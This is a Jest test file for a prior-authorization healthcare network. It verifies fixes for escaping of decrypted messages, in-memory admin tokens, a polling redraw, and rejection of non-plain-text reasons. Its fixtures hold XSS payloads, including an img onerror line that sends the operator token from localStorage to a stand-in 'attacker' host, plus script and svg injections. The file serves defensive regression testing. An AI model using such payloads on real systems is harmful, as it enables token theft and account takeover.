/*
 * Copyright 2026 Ben Humbert
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * The review of the prescriber quote and prior-authorization work (owner decision 2026-10-19): the screens and the
 * provider nodes.
 *
 * What was wrong:
 *  1. The operator console drew decrypted messages with innerHTML and no escaping (the member, prescriber, pharmacy and
 *     insurer tabs). A prescriber's reason for a prior authorization reaches the insurer in a message, and an insurer's
 *     reason for a denial reaches the prescriber in another, so either party could put markup in the page that keeps
 *     the network's operator token in localStorage.
 *  2. The prescriber dashboard kept its node's admin token in localStorage and wrote it back into the token field on
 *     every load: a credential that outlived the page on a shared workstation, readable by any later user of the
 *     browser profile and by anything running on the page's origin.
 *  3. The insurer's Employers & Groups page, once its 10 s poll ran, replaced the applications table with "Loading
 *     applications..." on every tick and drew it again, so the table blinked, the page jumped and a click could land
 *     during the redraw.
 *  4. The prescriber node and the insurer node passed a reason with markup or control characters on to the engine.
 *
 * Now the four tabs draw a thread through one renderer that escapes every value from the network; the prescriber
 * page holds the token in memory only and clears the field; the poll redraws only a changed list and never shows the
 * placeholder; both nodes refuse a reason that is not plain text with 400 before the engine is asked, the engine's own
 * rule (src/security/free-text.ts).
 *
 * The dashboards are plain browser scripts: functions are lifted out of their files and run with stand-ins.
 */
import fs from 'fs';
import os from 'os';
import path from 'path';
import http from 'http';
import type { AddressInfo } from 'net';

jest.setTimeout(120_000);

const NL = '\n';
const read = (file: string): string => fs.readFileSync(file, 'utf8').replace(/\r\n/g, NL);

/** A top-level function of an IIFE dashboard: from its declaration to the first line that is exactly "  }". */
function lift(src: string, name: string): string {
  let at = src.indexOf(NL + '  function ' + name + '(');
  if (at < 0) at = src.indexOf(NL + '  async function ' + name + '(');
  if (at < 0) throw new Error('no function ' + name);
  const end = src.indexOf(NL + '  }' + NL, at);
  return src.slice(at + 1, end + 4);
}
function run(pieces: string[], scope: Record<string, unknown>, ret: string): any {
  const names = Object.keys(scope);
  return new Function(...names, `'use strict';\n${pieces.join(NL)}\nreturn ${ret};`)(...names.map((n) => scope[n]));
}
const escHtml = (s: unknown): string => String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

const TABS = ['insurer-tab', 'prescriber-phase', 'pharmacy-phase', 'member-phase'];

describe('1. the console draws a decrypted thread as text', () => {
  const PRESCRIBER_WALLET = '7920000000000000000000000000000000000000000000000000000000000000000000000001';
  const INSURER_WALLET = '7920000000000000000000000000000000000000000000000000000000000000000000000099';
  const hostile = {
    senderWalletId: PRESCRIBER_WALLET, recipientWalletId: INSURER_WALLET, messageType: 2, timestamp: 1_760_000_000_000,
    subject: 'PA Request: <b>ABILIFY</b>',
    body: 'Prior auth requested for ABILIFY MAINTENA ER 300 MG SYR, 30 EA per fill\nReason: <img src=x onerror="fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)">',
  };

  test('every value from a message is escaped: the subject, the body, the sender\'s registered name and the type', () => {
    const src = read('visualizer/src/js/interactive/message-thread.js');
    const { renderMessageBubbles, escapeHtml } = new Function(`'use strict';\n${src.replace(/^export\s+/gm, '')}\nreturn { renderMessageBubbles, escapeHtml };`)();
    const html: string = renderMessageBubbles([hostile, null, { ...hostile, messageType: '2" onmouseover="steal()', subject: '' }], INSURER_WALLET, {
      [PRESCRIBER_WALLET]: { displayName: '<svg onload="steal()">Dr. Quill' },
    });
    expect(html).not.toMatch(/<img|<svg|<b>|onmouseover="/);                         // before: the markup itself
    expect(html).toContain('&lt;img src=x onerror=&quot;fetch(`https://attacker/?t=`+localStorage.zkt_operator_token)&quot;&gt;');
    expect(html).toContain('PA Request: &lt;b&gt;ABILIFY&lt;/b&gt;');
    expect(html).toContain('&lt;svg onload=&quot;steal()&quot;&gt;Dr. Quill');
    expect(html).toContain('class="msg-type-badge msg-type-2"');
    expect(html).toContain('class="msg-type-badge msg-type-0"');                     // a type that is not a number
    expect(html.match(/class="msg-bubble msg-received"/g)).toHaveLength(2);           // the empty entry is skipped
    expect(escapeHtml(`a&b'c`)).toBe('a&amp;b&#39;c');
  });

  test('the insurer, prescriber, pharmacy and member tabs all draw a thread through it, and the reply button\'s thread ID is escaped', () => {
    for (const tab of TABS) {
      const src = read(`visualizer/src/js/interactive/${tab}.js`);
      expect([tab, src.includes("import { escapeHtml, renderMessageBubbles } from './message-thread.js';")]).toEqual([tab, true]);
      const handler = src.slice(src.indexOf('/interactive/decrypt-thread'), src.indexOf("querySelector('.msg-reply-btn')"));
      expect([tab, /renderMessageBubbles\(decrypted, (member\.)?walletId, dir\)/.test(handler)]).toEqual([tab, true]);
      expect([tab, handler.includes('data-thread-id="${escapeHtml(threadId)}"')]).toEqual([tab, true]);
      for (const raw of ['${m.body}', '${m.subject}', '${senderName}']) expect([tab, raw, src.includes(raw)]).toEqual([tab, raw, false]);   // before: all three
    }
  });
});

describe('2. the prescriber page holds its node\'s admin token in memory only', () => {
  function loadRpc() {
    const touched: string[] = [];
    const sent: Array<{ url: string; init: any }> = [];
    const storage = {
      getItem: (k: string) => { touched.push(`get:${k}`); return 'a-token-kept-by-an-earlier-page'; },
      setItem: (k: string) => { touched.push(`set:${k}`); },
      removeItem: (k: string) => { touched.push(`remove:${k}`); },
    };
    const API = new Function('location', 'localStorage', 'fetch', 'EventSource', `${read('dashboard-prescriber/rpc.js')}\nreturn API;`)(
      { origin: 'http://127.0.0.1:4002' }, storage,
      async (url: string, init: any) => { sent.push({ url, init }); return { ok: true, status: 200, json: async () => ({ ok: true, data: { covered: true } }) }; },
      undefined,
    );
    return { API, touched, sent };
  }

  test('the page neither reads nor writes browser storage for it; a reload starts with no token', async () => {
    const page = loadRpc();
    expect(page.API.getAdminToken()).toBe('');                                       // before: the stored token
    page.API.setAdminToken('typed-token');
    expect(page.touched).toEqual([]);                                                // before: get and set of zkt_prescriber_admin_token
    await page.API.estimateCost({ ndcHash: '1', walletId: '79000000000000000001', quantity: 30 });
    expect(page.sent[0].init.headers.Authorization).toBe('Bearer typed-token');
    const reloaded = loadRpc();
    expect(reloaded.API.getAdminToken()).toBe('');
    await reloaded.API.estimateCost({ ndcHash: '1', walletId: '79000000000000000001', quantity: 30 });
    expect(reloaded.sent[0].init.headers.Authorization).toBeUndefined();
  });

  test('the token field is never filled from the page, and it is cleared once the token is set', () => {
    const els: Record<string, any> = {
      'admin-token-input': { value: '' },
      'admin-set-token': { listeners: {} as Record<string, () => void>, addEventListener(type: string, fn: () => void) { this.listeners[type] = fn; } },
    };
    const set: string[] = [];
    const toasts: string[] = [];
    let estimates = 0;
    const init = run([lift(read('dashboard-prescriber/app.js'), 'initAdminTokenBar')], {
      $: (sel: string) => els[sel.replace(/^#/, '')] ?? null,
      API: { getAdminToken: () => 'a-token-in-memory', setAdminToken: (t: string) => { set.push(t); } },
      toast: (m: string) => { toasts.push(m); },
      updateCostEstimate: () => { estimates++; },
    }, 'initAdminTokenBar');
    init();
    expect(els['admin-token-input'].value).toBe('');                                 // before: the saved token, written into the field
    els['admin-token-input'].value = '  typed-token  ';
    els['admin-set-token'].listeners.click();
    expect(set).toEqual(['typed-token']);
    expect(els['admin-token-input'].value).toBe('');
    expect(toasts).toEqual(['Node admin token set for this page']);
    expect(estimates).toBe(1);
  });
});

describe('3. the Employers & Groups poll redraws the applications only when they changed', () => {
  const APP = read('dashboard-insurer/app.js');
  const application = (status: string) => ({
    applicationId: 'APP-1', companyName: 'Acme Corp', employerId: 'EMP-ACME', ein: '12-3456789', selectedPlanIds: ['PLAN-A'],
    enrollmentCap: 50, status, submittedAt: 1_760_000_000_000, cp575DocumentId: 'DOC-1',
  });

  function page() {
    const writes: string[] = [];
    let html = '';
    const body = { get innerHTML() { return html; }, set innerHTML(v: string) { html = v; writes.push(v); } };
    let answer: () => Promise<unknown> = async () => [application('submitted')];
    const load = run(['var _appsLastHtml = null;', lift(APP, 'renderAppActions'), lift(APP, 'loadMarketplaceApplications')], {
      $: (id: string) => (id === 'marketplace-apps-body' ? body : null),
      esc: escHtml,
      API: { getEmployerApplications: () => answer() },
    }, 'loadMarketplaceApplications');
    return { load, writes, answerWith: (fn: () => Promise<unknown>) => { answer = fn; } };
  }

  test('a first load shows the placeholder; a poll that finds the same list writes nothing, and a changed list is swapped in without it', async () => {
    const p = page();
    await p.load();
    expect(p.writes).toHaveLength(2);
    expect(p.writes[0]).toContain('Loading applications...');
    expect(p.writes[1]).toContain('Acme Corp');
    p.writes.length = 0;
    await p.load({ quiet: true });
    expect(p.writes).toEqual([]);                                                    // before: the placeholder, then the same table
    p.answerWith(async () => [application('approved')]);
    await p.load({ quiet: true });
    expect(p.writes).toHaveLength(1);
    expect(p.writes[0]).toContain('Approved — awaiting employer signature');
    expect(p.writes[0]).not.toContain('Loading applications...');
  });

  test('a poll that fails leaves the table; the Refresh button still says it is loading and shows the failure', async () => {
    const p = page();
    await p.load();
    p.writes.length = 0;
    p.answerWith(async () => { throw new Error('insurer node unreachable'); });
    await p.load({ quiet: true });
    expect(p.writes).toEqual([]);
    await p.load({ type: 'click' });                                                 // the button passes its click event
    expect(p.writes).toEqual(['<div class="loading">Loading applications...</div>', '<div class="form-result error">Failed to load applications: insurer node unreachable</div>']);
  });

  test('the poll asks quietly', () => {
    const start = APP.indexOf('  var _appsPollTimer = null;');
    const pageCode = APP.slice(start, APP.indexOf(NL + '  }' + NL, start) + 4);
    let tick: (() => void) | null = null;
    const calls: unknown[] = [];
    const loadPage = run([pageCode, "var currentTab = 'employers';"], {
      $: () => null,
      loadMarketplaceApplications: (opts?: unknown) => { calls.push(opts); },
      loadRosterData: () => undefined,
      setInterval: (fn: () => void) => { tick = fn; return 1; },
      clearInterval: () => undefined,
    }, 'loadEmployersPage');
    loadPage();
    tick!();
    expect(calls).toEqual([undefined, { quiet: true }]);                             // before: [undefined, undefined]
  });
});

describe('4. the provider nodes refuse a reason that is not plain text before the engine is asked', () => {
  const C = (code: number) => String.fromCharCode(code);

  test('the prescriber node\'s POST /prior-auth/request', async () => {
    const { buildPrescriberRoutes } = await import('../src/nodes/routes/prescriber-routes.js');
    const engineCalls: Array<{ url: string; body: string }> = [];
    const sent: Array<{ status: number; error?: string }> = [];
    const fakeServer = {
      getEntityNode: () => ({ getWalletId: () => '5001', walletSigner: () => null, getClient: () => ({}) }),
      getConfig: () => ({ sequencerUrl: 'http://seq.test', adminToken: 'node-admin' }),
      getLocalState: () => ({ hasEnrollmentKey: () => false }),
      signedFetch: () => Promise.resolve(new Response('{}', { status: 500 })),
      walletSignedFetch: (url: string, init: any) => { engineCalls.push({ url, body: String(init.body) }); return Promise.resolve(new Response(JSON.stringify({ status: 'pending' }), { status: 200 })); },
      sendResponse(_res: unknown, status: number, _ok: boolean, _data?: unknown, error?: string) { sent.push({ status, error }); },
    };
    jest.useFakeTimers();   // the builder starts a PCP sync interval
    let routes: any[];
    try { routes = buildPrescriberRoutes(fakeServer as any); } finally { jest.useRealTimers(); }
    const route = routes.find((r) => r.method === 'POST' && r.path === '/prior-auth/request');
    const request = (reason: string) => route.handler({ headers: {} }, {}, {}, new URLSearchParams(), { walletId: '79000000000000000001', ndcHash: '123', quantity: 30, reason });

    await request('<b>urgent</b>');
    await request(`Oral therapy failed${C(0)}`);
    expect(sent.map((s) => s.status)).toEqual([400, 400]);                           // before: passed on to the engine
    expect(sent[0].error).toMatch(/may not contain < or >/);
    expect(sent[1].error).toMatch(/control characters other than a line break/);
    expect(engineCalls).toEqual([]);
    await request('Oral therapy failed.\nA1c 9.1%');
    expect(sent[2].status).toBe(200);
    expect(JSON.parse(engineCalls[0].body)).toMatchObject({ reason: 'Oral therapy failed.\nA1c 9.1%' });
  });

  test('the insurer node\'s POST /prior-auth/:id/deny', async () => {
    const { NautilusAppServer } = await import('../src/nodes/nautilus-app-server.js');
    const { buildInsurerRoutes } = await import('../src/nodes/routes/insurer-routes.js');
    const { generateNodeKey } = await import('../src/security/node-roles.js');
    const engineCalls: string[] = [];
    const engine = http.createServer((req, res) => {
      engineCalls.push(`${req.method} ${req.url}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ paId: 'PA-0001', status: 'DENIED', medication: { brandName: 'ABILIFY' } }));
    });
    await new Promise<void>((resolve) => engine.listen(0, '127.0.0.1', () => resolve()));
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pa-review-insurer-'));
    const key = generateNodeKey('insurer-node');
    const server = new NautilusAppServer({
      role: 'insurer', port: 0, host: '127.0.0.1', sequencerUrl: `http://127.0.0.1:${(engine.address() as AddressInfo).port}`, stateDir: dir,
      enableSSE: false, maxSseConnections: 0, allowedOrigins: [], adminToken: 'insurer-admin', nodeKey: { nodeId: key.nodeId, seedHex: key.seedHex },
    } as any);
    server.registerRoutes(buildInsurerRoutes(server));
    await server.start();
    try {
      const deny = async (reason: string) => {
        const r = await fetch(`http://127.0.0.1:${server.getPort()}/prior-auth/PA-0001/deny`, {
          method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: 'Bearer insurer-admin' }, body: JSON.stringify({ reason }),
        });
        return { status: r.status, json: await r.json() as any };
      };
      const markup = await deny('<script>steal()</script>');
      expect([markup.status, markup.json.error]).toEqual([400, expect.stringMatching(/may not contain < or >/)]);   // before: sent to the engine
      expect((await deny(`${C(27)}[2J`)).status).toBe(400);
      expect(engineCalls).toEqual([]);
      expect((await deny('Formulary alternative available')).status).toBe(200);
      expect(engineCalls).toEqual(['POST /interactive/deny-prior-auth']);
    } finally {
      await server.stop();
      await new Promise<void>((resolve) => engine.close(() => resolve()));
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
